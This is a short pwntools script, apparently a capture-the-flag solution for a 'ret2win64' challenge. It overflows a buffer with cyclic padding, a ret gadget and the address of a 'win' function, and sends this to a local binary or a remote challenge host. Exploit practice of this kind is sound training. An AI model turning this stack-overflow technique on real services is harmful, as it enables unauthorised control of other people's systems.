#!/usr/bin/env python3

from os.path import dirname
from pwn import *

elf = context.binary = ELF(f"{dirname(__file__)}/../generate/ret2win64")
rop = ROP(elf)

PADDING = b'A' * cyclic_find(0x616161616161616a, n=8)
RET_GADGET = p64(rop.ret.address)
WIN = p64(elf.sym["win"])


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='continue')

    if args.REMOTE:
        return remote("pwn.platypew.social", 30001)

    return process(elf.path)

p = start()

p.sendline(PADDING + RET_GADGET + WIN)
p.interactive()
